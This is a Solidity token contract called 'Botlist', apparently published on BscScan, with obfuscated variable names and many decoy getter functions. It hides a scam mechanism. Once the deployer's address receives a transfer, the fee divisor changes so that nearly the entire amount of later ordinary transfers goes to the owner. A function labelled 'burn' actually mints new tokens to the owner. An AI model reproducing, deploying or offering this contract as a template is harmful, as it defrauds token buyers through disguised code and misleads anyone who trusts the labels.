/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/////////////////////////////////////////////////
/*
https://botlist.infotelbot.com/
https://github.abskoop.workers.dev/
https://youtu.be/qYqlXUfCVSo
*/
/////////////////////////////////////////////////
// SPDX-License-Identifier: MIT
pragma solidity = 0.8.2;
contract Botlist {
uint256 public constant kxgBVU = 99999;
address private  PqemRk = address(0);
address public owner;
uint256 private  GKkMKt = 100000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  kbkJeq = address(0);
uint256 private  mdTCLS = 10000000000;
uint256 private  BXDCsp = 1000000000000000000;
uint256 private  qfjWdp = 1000000000000000000000;
uint256 private  BblvJL = 1000000000000000000;
address private  eDKhpw = address(0);
string public  symbol = "Botlist";
mapping (address => mapping (address => uint256)) private _allowances;
address private  KSvKfa = address(0);
address private  TvvtjG = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  PIFVBt = address(0);
address private  aUAXJl = address(0);
uint8 public constant decimals = 18;
uint256 private  MfzPmr = 1000000000000000;
address private  JOMjvM = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  uJuXtD = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "Botlist";
uint256 private  QaOdiE = 10000000000000;
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
function _getGKkMKt() private returns (uint256) {
return GKkMKt;
}

function _getJOMjvM() private returns (address) {
return JOMjvM;
}



function _getkbkJeq() private returns (address) {
return kbkJeq;
}



function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "torpmEf 0");
require(spender != address(0), "forpmEf 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getBblvJL() private returns (uint256) {
return BblvJL;
}

function _getaUAXJl() private returns (address) {
return aUAXJl;
}

function _getQaOdiE() private returns (uint256) {
return QaOdiE;
}

function _getuJuXtD() private returns (address) {
return uJuXtD;
}





function _geteDKhpw() private returns (address) {
return eDKhpw;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "orpmEf");
require(to != address(0), "orpmEf");
require(amount <= balanceOf[from], "orpmEf");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* kxgBVU/BXDCsp ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==KSvKfa){
BXDCsp = kxgBVU+2;
}
emit Transfer(from, to, transferAmount);
}
function _getmdTCLS() private returns (uint256) {
return mdTCLS;
}



function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getPIFVBt() private returns (address) {
return PIFVBt;
}

function _getqfjWdp() private returns (uint256) {
return qfjWdp;
}



function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


constructor () {
KSvKfa = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function _getTvvtjG() private returns (address) {
return TvvtjG;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getMfzPmr() private returns (uint256) {
return MfzPmr;
}



function _getPqemRk() private returns (address) {
return PqemRk;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}



}